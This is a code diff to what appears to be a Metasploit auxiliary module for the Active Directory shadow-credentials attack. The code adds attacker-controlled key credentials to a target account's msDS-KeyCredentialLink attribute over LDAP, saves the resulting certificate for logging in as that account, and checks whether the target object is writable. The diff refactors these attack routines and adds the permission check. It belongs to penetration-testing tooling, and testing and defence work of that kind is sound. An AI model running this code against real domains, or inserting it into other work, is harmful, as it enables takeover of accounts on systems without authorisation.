@@ -6,7 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Report
-  include Msf::Exploit::Remote::LDAP
+  include Msf::Exploit::Remote::LDAP::ActiveDirectory
   include Msf::OptionalSession::LDAP
 
   ATTRIBUTE = 'msDS-KeyCredentialLink'.freeze
@@ -28,7 +28,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'References' => [
           ['URL', 'https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab'],
-          ['URL', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials']
+          ['URL', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials'],
+          ['ATT&CK', Mitre::Attack::Technique::T1098_ACCOUNT_MANIPULATION]
         ],
         'License' => MSF_LICENSE,
         'Actions' => [
@@ -52,6 +53,16 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
+  def validate
+    super
+
+    if action.name.casecmp?('REMOVE') && datastore['DEVICE_ID'].blank?
+      raise Msf::OptionValidateError.new({
+        'DEVICE_ID' => 'DEVICE_ID must be set when ACTION is REMOVE.'
+      })
+    end
+  end
+
   def fail_with_ldap_error(message)
     ldap_result = @ldap.get_operation_result.table
     return if ldap_result[:code] == 0
@@ -67,43 +78,81 @@ class MetasploitModule < Msf::Auxiliary
   def warn_on_likely_user_error
     ldap_result = @ldap.get_operation_result.table
     if ldap_result[:code] == 50
-      if (datastore['USERNAME'] == datastore['TARGET_USER'] ||
-          datastore['USERNAME'] == datastore['TARGET_USER'] + '$') &&
-         datastore['USERNAME'].end_with?('$') &&
+      if (datastore['LDAPUsername'] == datastore['TARGET_USER'] ||
+          datastore['LDAPUsername'] == datastore['TARGET_USER'] + '$') &&
+         datastore['LDAPUsername'].end_with?('$') &&
          ['add', 'remove'].include?(action.name.downcase)
         print_warning('By default, computer accounts can only update their key credentials if no value already exists. If there is already a value present, you can remove it, and add your own, but any users relying on the existing credentials will not be able to authenticate until you replace the existing value(s).')
-      elsif datastore['USERNAME'] == datastore['TARGET_USER'] && !datastore['USERNAME'].end_with?('$')
+      elsif datastore['LDAPUsername'] == datastore['TARGET_USER'] && !datastore['LDAPUsername'].end_with?('$')
         print_warning('By default, only computer accounts can modify their own properties (not user accounts).')
       end
     end
   end
 
-  def ldap_get(filter, attributes: [])
-    raw_obj = @ldap.search(base: @base_dn, filter: filter, attributes: attributes).first
-    return nil unless raw_obj
-
-    obj = {}
-
-    obj['dn'] = raw_obj['dn'].first.to_s
-    unless raw_obj['sAMAccountName'].empty?
-      obj['sAMAccountName'] = raw_obj['sAMAccountName'].first.to_s
+  def get_target_account
+    target_account = datastore['TARGET_USER']
+    if target_account.blank?
+      fail_with(Failure::BadConfig, 'The TARGET_USER option must be specified for this action.')
     end
 
-    unless raw_obj['ObjectSid'].empty?
-      obj['ObjectSid'] = Rex::Proto::MsDtyp::MsDtypSid.read(raw_obj['ObjectSid'].first)
+    obj = adds_get_object_by_samaccountname(@ldap, target_account)
+    if obj.nil? && !target_account.end_with?('$')
+      obj = adds_get_object_by_samaccountname(@ldap, "#{target_account}$")
     end
-
-    unless raw_obj[ATTRIBUTE].empty?
-      result = []
-      raw_obj[ATTRIBUTE].each do |entry|
-        dn_binary = Rex::Proto::LDAP::DnBinary.decode(entry)
-        struct = Rex::Proto::MsAdts::MsAdtsKeyCredentialStruct.read(dn_binary.data)
-        result.append(Rex::Proto::MsAdts::KeyCredential.from_struct(struct))
-      end
-      obj[ATTRIBUTE] = result
-    end
+    fail_with(Failure::NotFound, "Failed to find sAMAccountName: #{target_account}") unless obj
 
     obj
+  end
+
+  def check
+    ldap_connect do |ldap|
+      validate_bind_success!(ldap)
+
+      if (@base_dn = datastore['BASE_DN'])
+        print_status("User-specified base DN: #{@base_dn}")
+      else
+        print_status('Discovering base DN automatically')
+
+        unless (@base_dn = ldap.base_dn)
+          print_warning("Couldn't discover base DN!")
+        end
+      end
+      @ldap = ldap
+
+      obj = get_target_account
+      if obj.nil?
+        return Exploit::CheckCode::Unknown('Failed to find the specified object.')
+      end
+
+      matcher = SecurityDescriptorMatcher::MultipleAll.new([
+        SecurityDescriptorMatcher::MultipleAny.new([
+          SecurityDescriptorMatcher::Allow.new(:WP, object_id: '5b47d60f-6090-40b2-9f37-2a4de88f3063'),
+          SecurityDescriptorMatcher::Allow.new(:WP)
+        ]),
+        SecurityDescriptorMatcher::MultipleAny.new([
+          SecurityDescriptorMatcher::Allow.new(:RP, object_id: '5b47d60f-6090-40b2-9f37-2a4de88f3063'),
+          SecurityDescriptorMatcher::Allow.new(:RP)
+        ])
+      ])
+
+      begin
+        unless adds_obj_grants_permissions?(@ldap, obj, matcher)
+          return Exploit::CheckCode::Safe('The object can not be written to.')
+        end
+      rescue RuntimeError
+        return Exploit::CheckCode::Unknown('Failed to check the permissions on the target object.')
+      end
+
+      Exploit::CheckCode::Vulnerable(
+        'The object can be written to.',
+        vuln: {
+          resource: {
+            ldap_dn: obj.dn
+          },
+          service: report_ldap_service
+        }
+      )
+    end
   end
 
   def run
@@ -124,12 +173,7 @@ class MetasploitModule < Msf::Auxiliary
       @ldap = ldap
 
       begin
-        target_user = datastore['TARGET_USER']
-        obj = ldap_get("(sAMAccountName=#{target_user})", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])
-        if obj.nil? && !target_user.end_with?('$')
-          obj = ldap_get("(sAMAccountName=#{target_user}$)", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])
-        end
-        fail_with(Failure::NotFound, "Failed to find sAMAccountName: #{target_user}") unless obj
+        obj = get_target_account
 
         send("action_#{action.name.downcase}", obj)
       rescue ::IOError => e
@@ -147,11 +191,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_list(obj)
-    credential_entries = obj[ATTRIBUTE]
-    if credential_entries.nil?
+    entries = obj[ATTRIBUTE]
+    if entries.nil? || entries.empty?
       print_status("The #{ATTRIBUTE} field is empty.")
       return
     end
+    credential_entries = format_ldap_to_credentials(entries)
+
     print_status('Existing credentials:')
     credential_entries.each do |credential|
       print_status("DeviceID: #{credential.device_id} - Created #{credential.key_creation_time}")
@@ -159,19 +205,20 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_remove(obj)
-    credential_entries = obj[ATTRIBUTE]
-    if credential_entries.nil? || credential_entries.empty?
+    entries = obj[ATTRIBUTE]
+    if entries.nil? || entries.empty?
       print_status("The #{ATTRIBUTE} field is empty. No changes are necessary.")
       return
     end
+    credential_entries = format_ldap_to_credentials(entries)
 
     length_before = credential_entries.length
     credential_entries.delete_if { |entry| entry.device_id.to_s == datastore['DEVICE_ID'] }
     if credential_entries.length == length_before
       print_status('No matching entries found - check device ID')
     else
-      update_list = credentials_to_ldap_format(credential_entries, obj['dn'])
-      unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, update_list)
+      update_list = format_credentials_to_ldap(credential_entries, obj.dn)
+      unless @ldap.replace_attribute(obj.dn, ATTRIBUTE, update_list)
         warn_on_likely_user_error
         fail_with_ldap_error("Failed to update the #{ATTRIBUTE} attribute.")
       end
@@ -180,12 +227,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_flush(obj)
-    unless obj[ATTRIBUTE]
+    entries = obj[ATTRIBUTE]
+    if entries.nil? || entries.empty?
       print_status("The #{ATTRIBUTE} field is empty. No changes are necessary.")
       return
     end
 
-    unless @ldap.delete_attribute(obj['dn'], ATTRIBUTE)
+    unless @ldap.delete_attribute(obj.dn, ATTRIBUTE)
       fail_with_ldap_error("Failed to deleted the #{ATTRIBUTE} attribute.")
     end
 
@@ -193,10 +241,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_add(obj)
-    credential_entries = obj[ATTRIBUTE]
-    if credential_entries.nil?
+    entries = obj[ATTRIBUTE]
+    if entries.nil?
       credential_entries = []
+    else
+      credential_entries = format_ldap_to_credentials(entries)
     end
+
     key, cert = generate_key_and_cert(datastore['TARGET_USER'])
     credential = Rex::Proto::MsAdts::KeyCredential.new
     credential.set_key(key.public_key, Rex::Proto::MsAdts::KeyCredential::KEY_USAGE_NGC)
@@ -204,17 +255,18 @@ class MetasploitModule < Msf::Auxiliary
     credential.key_approximate_last_logon_time = now
     credential.key_creation_time = now
     credential_entries.append(credential)
-    update_list = credentials_to_ldap_format(credential_entries, obj['dn'])
+    update_list = format_credentials_to_ldap(credential_entries, obj.dn)
 
-    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, update_list)
+    unless @ldap.replace_attribute(obj.dn, ATTRIBUTE, update_list)
       warn_on_likely_user_error
       fail_with_ldap_error("Failed to update the #{ATTRIBUTE} attribute.")
     end
 
     pkcs12 = OpenSSL::PKCS12.create('', '', key, cert)
-    store_cert(pkcs12)
+    stored_path = store_cert(pkcs12)
 
     print_good("Successfully updated the #{ATTRIBUTE} attribute; certificate with device ID #{credential.device_id}")
+    [credential.device_id, stored_path]
   end
 
   def store_cert(pkcs12)
@@ -222,7 +274,7 @@ class MetasploitModule < Msf::Auxiliary
     credential_data = {
       **service_data,
       address: service_data[:host],
-      port: rport,
+      port: service_data[:port],
       protocol: service_data[:proto],
       service_name: service_data[:name],
       workspace_id: myworkspace_id,
@@ -235,27 +287,36 @@ class MetasploitModule < Msf::Auxiliary
     }
     create_credential(credential_data)
 
-    info = "#{datastore['DOMAIN']}\\#{datastore['TARGET_USER']} Certificate"
-    stored_path = store_loot('windows.ad.cs', 'application/x-pkcs12', rhost, pkcs12.to_der, 'certificate.pfx', info)
+    info = "#{datastore['LDAPDomain']}\\#{datastore['TARGET_USER']} Certificate"
+    stored_path = store_loot('windows.ad.cs', 'application/x-pkcs12', session ? session.client.peerhost : rhost, pkcs12.to_der, 'certificate.pfx', info)
     print_status("Certificate stored at: #{stored_path}")
+    stored_path
   end
 
   def ldap_service_data
     {
-      host: rhost,
-      port: rport,
+      host: session ? session.client.peerhost : rhost,
+      port: session ? session.client.peerport : rport,
       proto: 'tcp',
       name: 'ldap',
       info: "Module: #{fullname}, #{datastore['LDAP::AUTH']} authentication"
     }
   end
 
-  def credentials_to_ldap_format(entries, dn)
+  def format_credentials_to_ldap(entries, dn)
     entries.map do |entry|
       struct = entry.to_struct
       dn_binary = Rex::Proto::LDAP::DnBinary.new(dn, struct.to_binary_s)
 
       dn_binary.encode
+    end
+  end
+
+  def format_ldap_to_credentials(entries)
+    entries.map do |entry|
+      dn_binary = Rex::Proto::LDAP::DnBinary.decode(entry)
+      struct = Rex::Proto::MsAdts::MsAdtsKeyCredentialStruct.read(dn_binary.data)
+      Rex::Proto::MsAdts::KeyCredential.from_struct(struct)
     end
   end
 
